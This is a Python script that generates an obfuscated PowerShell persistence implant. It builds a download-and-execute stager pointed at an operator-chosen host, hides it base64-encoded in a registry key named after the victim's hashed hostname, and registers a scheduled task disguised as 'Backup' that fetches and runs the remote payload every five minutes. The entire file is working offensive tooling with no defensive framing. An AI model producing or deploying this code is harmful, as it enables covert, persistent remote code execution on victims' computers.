import sys, base64

args = sys.argv
port = "80"
protocol = "http"
targetFile = ""
launcher = "-NOProF -sTA -winDoW 1 -enc "
url = "/agent.txt"

# Process Arguments

if len(args) < 2:
    print "Usage: ./anchor.py [IP/HOSTNAME] [PORT] [HTTP/HTTPS] [SCRIPT URL]"
    print "Description: Generates a powershell script to set up persistence via scheduled tasks."
    print "\tthe stager script is stored in a ref key, and is used to pull a payload from the SCRIPT URL"
    print "PORT defaults to 80 and is optional."
    print "HTTP/HTTPS defaults to HTTP and is optional."
    print "SCRIPT URL defaults to /agent.txt"
    exit()
elif len(args) == 3:
    host = args[1]
    port = args[2]
elif len(args) >= 4:
    host = args[1]
    port = args[2]
    if args[3].lower() == "https":
        protocol = "https"
    if len(args) > 4:
        url = args[4]
else:
    host = args[1]


# Build and Encode Default Payload
# TODO Implement Custom Payload
payload = "$U=\"" + protocol + "://" + host + ":" + port + url +"\";" 
payload += "Try{$R=Invoke-WebRequest -uri $U -useb;}Catch{$ErrorCode=$_.Exception.Response.StatusCode.Value__;Exit;};"
payload += "$AL=\"" + launcher +  "\"+$R.content;Start-Process powershell.exe -Verb open -ArgumentList $AL"

print "Using Default Payload: "
print payload
print ""

payload = payload.encode('utf-16-le')
payload = base64.b64encode(payload)

# Build Persistence Script
# TODO Implement Options
regPath = "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Debug\\"
regValue = payload
binary = "Powershell.exe"
arguments = "-nOpR -wInDO 1 -sTa -enc "
taskName = "Backup"
minutes = "5"
overWriteReg = "True"
overWriteST = "True"

# Set Variables
script = "$RP=\"" + regPath + "\";"
script += "$RV=\"" + payload + "\";"
script += "$B=\"" + binary + "\";"
script += "$A=\"" + arguments + "\";"
script += "$TN=\"" + taskName + "\";"
script += "$M=\"" + minutes + "\";"
script += "$OR=\"$" + overWriteReg + "\";"
script += "$OS=\"$" + overWriteST + "\";"

# Get MD5 Hash HostName
script += "$N=[System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME);"
script += "$N=[System.Security.Cryptography.HashAlgorithm]::Create(\"MD5\").ComputeHash($N);"
script += "$N=[System.BitConverter]::ToString($N).Replace(\"-\",\"\").ToLower();"

# Set Reg Key
script += "If(-Not(Test-Path $RP)){"
script += "New-Item -Path $RP|Out-Null;"
script += "};"

script += "$K=Get-ItemProperty -Path $RP;"
script += "$KV=Get-Member -InputObject $K -Name $N -ErrorAction SilentlyContinue;"

script += "If(-Not $KV){"
script += "New-ItemProperty -Path $RP -Name $N -Value $RV|Out-Null;"
script += "}ElseIf($OR){"
script += "New-ItemProperty -Path $RP -Name $N -Value $RV -Force|Out-Null;"
script += "}Else{"
script += "Write-Host \"Persistence Already Exists:\";"
script += "Write-Host $K.$N;"
script += "Exit;"
script += "};"

# Build ST Payload
# TODO Implement Custom ST Payload
script += "$R=\"`$X=(Get-ItemProperty -Path `\"$RP`\" -Name `\"$N`\").`\"$N`\";IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$X)));\";"
script += "$R=[System.Text.Encoding]::Unicode.GetBytes($R);"
script += "$R=[Convert]::ToBase64String($R);"
script += "$A+=$R;"

# Create ST Action and Trigger
script += "$AN=New-ScheduledTaskAction -Execute $B -Argument $A;"
script += "$T=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes $M);"
script += "If($OS){"
script += "Register-ScheduledTask -TaskName $TN -Action $AN -Trigger $T -Force;"
script += "}Else{"
script += "Register-ScheduledTask -TaskName $TN -Action $AN -Trigger $T -ErrorAction SilentlyContinue"
script += "};"

print "Script to set persisitence:"
print script
print
print "B64 Encoded version:"
script = script.encode('utf-16-le')
script = base64.b64encode(script)
print script
